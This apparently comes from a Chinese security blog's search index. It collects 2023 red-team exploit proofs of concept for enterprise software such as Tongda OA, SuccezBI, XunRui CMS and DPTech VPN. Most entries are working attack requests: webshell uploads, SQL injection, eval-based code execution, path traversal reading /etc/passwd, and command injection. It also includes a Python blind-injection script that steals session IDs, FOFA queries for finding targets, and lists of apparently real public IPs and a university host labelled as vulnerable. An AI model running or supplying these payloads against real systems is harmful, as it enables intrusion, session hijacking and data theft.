前台任意文件上传","uri":"/%E8%B5%9B%E6%80%9D-succezbi-uploadchunkfile-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"赛思 SuccezBl前台任意文件上传 POST /succezbi/sz/commons/form/file/uploadChunkFile?guid=../tomcat/webapps/ROOT/\u0026chunk=ss.jsp HTTP/1.1 Host: 10.168.4.99:808 Content-Length: 49564 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8GeAY18LCxR7XnVP User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8, application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN, zh;q=0.9 Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2 Connection: close ------WebKitFormBoundary8GeAY18LCxR7XnVP Content-Disposition: form-data; name=\"file\"; filename=\"www\" Content-Type: image/jpeg webshell ------WebKitFormBoundary8GeAY18LCxR7XnVP Content-Disposition: form-data; name=\"xxx\" confirm ------WebKitFormBoundary8GeAY18LCxR7XnVP-- ","date":"2023-12-08","objectID":"/%E8%B5%9B%E6%80%9D-succezbl%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw漏洞"],"title":"赛思 SuccezBl前台任意文件上传","uri":"/%E8%B5%9B%E6%80%9D-succezbl%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"```\rPOST /api/user/login captcha=\u0026password=21232f297a57a5a743894a0e4a801fc3\u0026username=admin’and(select*from(select+sleep(3))a)=' ","date":"2023-12-08","objectID":"/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"辰信景云终端安全管理系统 login SQL注入漏洞","uri":"/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"https://www.linuxlz.com/aqld/2985.html\rhttp://localhost:2333/index.php?s=api\u0026c=api\u0026m=template\u0026app=admin\u0026name=api_related.html\u0026phpcmf_dir=admin\u0026mid= action=function name=system param0=calc ","date":"2023-12-08","objectID":"/%E8%BF%85%E7%9D%BFcmsxunruicms-4.5.0%E7%89%88%E6%9C%AC-api_related_html-%E6%96%87%E4%BB%B6-%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"迅睿CMSXUNRUICMS 4.5.0版本 api_related_html 文件 存在远程代码执行漏洞","uri":"/%E8%BF%85%E7%9D%BFcmsxunruicms-4.5.0%E7%89%88%E6%9C%AC-api_related_html-%E6%96%87%E4%BB%B6-%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"影响版本:version \u003c= 4.6.2.2\r/webui/g=aaa_lacal_custom_auth_submit\u0026suffix=$(id%7Ctee$%7BIFS%7D../.i9qk41) GET /.i9qk41 ","date":"2023-12-08","objectID":"/%E8%BF%88%E6%99%AE-mpsec-msg4000-%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_lacal_custom_auth_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"迈普 MPSec MSG4000 安全网关 aaa_lacal_custom_auth_submit 远程命令执行漏洞","uri":"/%E8%BF%88%E6%99%AE-mpsec-msg4000-%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_lacal_custom_auth_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"迪普DPTech VPN 任意文件读取 CNVD-2023-69478 杭州迪普科技股份有限公司DPtech SSL VPN存在任意文件读取漏洞，攻击者可利用该漏洞获敏感信息。 ","date":"2023-12-08","objectID":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":["2023hw漏洞"],"title":"迪普DPTech VPN 任意文件读取","uri":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"漏洞影响产品 杭州迪普科技股份有限公司DPtech SSL VPN ","date":"2023-12-08","objectID":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:2:0","tags":["2023hw漏洞"],"title":"迪普DPTech VPN 任意文件读取","uri":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"fofa title==\"SSL VPN Service\" \u0026\u0026 header=\"Dptech\" || cert=\"DPtechCa\" ","date":"2023-12-08","objectID":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:3:0","tags":["2023hw漏洞"],"title":"迪普DPTech VPN 任意文件读取","uri":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"poc GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1 Host: xxxxxxxxx Cookie: SSLVPN_lang=1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0 se ","date":"2023-12-08","objectID":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:4:0","tags":["2023hw漏洞"],"title":"迪普DPTech VPN 任意文件读取","uri":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:5:0","tags":["2023hw漏洞"],"title":"迪普DPTech VPN 任意文件读取","uri":"/%E8%BF%AA%E6%99%AEdptech-vpn-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-retrieve_pwd.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"通达 oa retrieve_pwd.php sql注入漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-retrieve_pwd.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://60.190.185.74:88/ispirit/retrieve_pwd.php?_GET[username]=admin' and '1'='1 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-retrieve_pwd.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"通达 oa retrieve_pwd.php sql注入漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-retrieve_pwd.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"通达 oa share handle.php sql注入漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://60.190.185.74:88/share/handle.php?_GET[module]=1'+and+1={%60='%60+1}+and+1=0+union+select+(select/**/version())--+%27 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"通达 oa share handle.php sql注入漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"例子 http://1.202.216.130:3199/share/handle.php?_GET[module]=1'' http://120.76.73.200:70/share/handle.php?_GET[module]=1'' http://124.88.210.76:888/share/handle.php?_GET[module]=1'' http://183.250.243.227:8001/share/handle.php?_GET[module]=1'' http://218.16.142.55:8888/share/handle.php?_GET[module]=1'' http://218.70.17.86:88/share/handle.php?_GET[module]=1'' http://60.190.185.74:88/share/handle.php?_GET[module]=1'' 通过sql注入获取管理员cookie， ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"通达 oa share handle.php sql注入漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-share-handle.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 11.9 SP7 dologin 方法代码执行漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)).eval(stripslashes($_REQUEST[8])).print_r(md5(123)),// HTTP/1.1 Host: 113.107.65.50:11481 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 19 8=echo \"123456789\"; ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 11.9 SP7 dologin 方法代码执行漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"例子 http://182.139.37.147:88/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// http://oa.nnnu.edu.cn/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// http://222.128.27.216:89/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// http://222.141.70.202/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// http://222.141.70.202:90/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// https://222.189.189.199/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),// ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 11.9 SP7 dologin 方法代码执行漏洞","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-11.9-sp7-dologin-%E6%96%B9%E6%B3%95%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 ueditor moduleueditorphpaction_upload.php任意文件上传","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"exp POST /module/ueditor/php/action_upload.php?action=uploadimage\u0026CONFIG[imagePathFormat]=module/ueditor/php/upload/test\u0026CONFIG[imageMaxSize]=9999999\u0026CONFIG[imageAllowFiles][]=.php\u0026CONFIG[imageFieldName]=test HTTP/1.1 Host: 60.190.185.74:88 accept: */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=bvdnf1pq3ag7c7gej46f6i4g80; KEY_RANDOMDATA=11700 Content-Type: multipart/form-data; boundary=0b10048704813c1097efc627598b2d3e Connection: close Content-Length: 204 --0b10048704813c1097efc627598b2d3e Content-Disposition: form-data; name=\"test\"; filename=\"test.php\" Content-Type: application/octet-stream \u003c?php echo '555';?\u003e --0b10048704813c1097efc627598b2d3e— http://60.190.185.74:88/module/ueditor/php/upload/test.php ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 ueditor moduleueditorphpaction_upload.php任意文件上传","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"例子 http://1.202.216.130:3199 http://117.159.225.185:8088 http://125.31.39.26:8088 http://139.159.189.132:7086 http://148.70.171.132:81 http://183.250.243.227:8001 http://218.16.142.55:8888 http://218.70.17.86:88 http://60.190.185.74:88 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw"],"title":"通达 oa 协同办公系统 ueditor moduleueditorphpaction_upload.php任意文件上传","uri":"/%E9%80%9A%E8%BE%BE-oa-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-ueditor-moduleueditorphpaction_upload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"https://blog.csdn.net/weixin_39779975/article/details/111091529\rhttps://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE2017oa%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-generaldocumentindex.phprecvregisterinsert-%E8%8E%B7%E5%8F%96session/:0:0","tags":["2023hw"],"title":"通达2017OA前台SQL注入 generaldocumentindex.phprecvregisterinsert 获取session ","uri":"/%E9%80%9A%E8%BE%BE2017oa%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-generaldocumentindex.phprecvregisterinsert-%E8%8E%B7%E5%8F%96session/"},{"categories":["2023hw"],"content":"脚本 # -*- coding:utf-8 -*- import requests def hello(url, payload): result = \"\" payload_bak = payload for len in range(1, 27): str = '0' for i in range(0, 7): payload = payload.format(len, 6 - i, int(str + '0', 2)) data = {payload: \"1\", \"_SERVER\": \"\"} r = requests.post(url, data=data, timeout=10, verify=False, allow_redirects=False) # print(r.status_code) if r.status_code == 302: str = str + '0' elif r.status_code == 500: str = str + '1' else: hello(url, payload) payload = payload_bak result += chr(int(str, 2)) if int(str, 2) == 127: print(\"系统当前无正在登录的用户...\") return result print(\"第%d位为: %s\" % (len, chr(int(str, 2)))) return result def main(): url = \"http://60.190.185.74:88/general/document/index.php/recv/register/insert\" payload = \"\"\"title)values(\"'\"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),{},1))\u003e\u003e{}={}),1,710)))# \"\"\" print(\"PHPSESSID=%s\" % hello(url, payload)) if __name__ == \"__main__\": main() ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BE2017oa%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-generaldocumentindex.phprecvregisterinsert-%E8%8E%B7%E5%8F%96session/:1:0","tags":["2023hw"],"title":"通达2017OA前台SQL注入 generaldocumentindex.phprecvregisterinsert 获取session ","uri":"/%E9%80%9A%E8%BE%BE2017oa%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-generaldocumentindex.phprecvregisterinsert-%E8%8E%B7%E5%8F%96session/"},{"categories":["2023hw"],"content":"```\rGET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count()%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-delete_log.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:0:0","tags":["2023hw"],"title":"通达OA delete_log.php sql注入漏洞 CVE-2023-4166 ","uri":"/%E9%80%9A%E8%BE%BEoa-delete_log.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw"],"content":"```\rGET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count()%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-delete_seal.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:0:0","tags":["2023hw"],"title":"通达OA delete_seal.php sql注入漏洞 CVE-2023-4165 ","uri":"/%E9%80%9A%E8%BE%BEoa-delete_seal.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"通达OA down.php接口存在未授权访问漏洞 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"通达OA down.php接口存在未授权访问漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"通达OA down.php接口存在未授权访问漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc http://127.0.0.1/inc/package/down.php?id=../../../cache/org GET /inc/package/down.php?id=../../../cache/org HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"通达OA down.php接口存在未授权访问漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-down.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:0:0","tags":["2023hw"],"title":"通达OA gateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw"],"content":"ispirit/interface/gateway.php POST /ispirit/interface/gateway.php HTTP/1.1 Host: 60.190.185.74:88 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 54 json={\"url\":\"/general/../../nginx/logs/oa.access.log\"} ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:1:0","tags":["2023hw"],"title":"通达OA gateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw"],"content":"mac/gateway.php POST /mac/gateway.php HTTP/1.1 Host: 60.190.185.74:88 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 54 json={\"url\":\"/general/../../nginx/logs/oa.access.log\"} ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:2:0","tags":["2023hw"],"title":"通达OA gateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw"],"content":"包含my.ini http://60.190.185.74:88/mac/gateway.php?json={\"url\":\"/general/../../mysql5/my.ini\"} ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:3:0","tags":["2023hw"],"title":"通达OA gateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw"],"content":"例子 124.88.210.76:888 218.16.142.55:8888 218.70.17.86:88 60.190.185.74:88 60.6.214.120:88 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:4:0","tags":["2023hw"],"title":"通达OA gateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-gateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw漏洞"],"content":"通达OA get_datas.php前台sql注入 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw漏洞"],"title":"通达OA get_datas.php前台sql注入","uri":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"TDXK-通达OA\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw漏洞"],"title":"通达OA get_datas.php前台sql注入","uri":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"POC POST /general/reportshop/utils/get_datas.php HTTP/1.1 Host: {{HostName}} Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36 Content-Length: 2 USER_ID=OfficeTask\u0026PASSWORD=\u0026col=1,1\u0026tab=5 where 1={`\\='` 1} union (select uid,sid from user_online where 1\\={`=` 1})-- '1** ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:3:0","tags":["2023hw漏洞"],"title":"通达OA get_datas.php前台sql注入","uri":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"漏洞来源 https://forum.butian.net/share/278 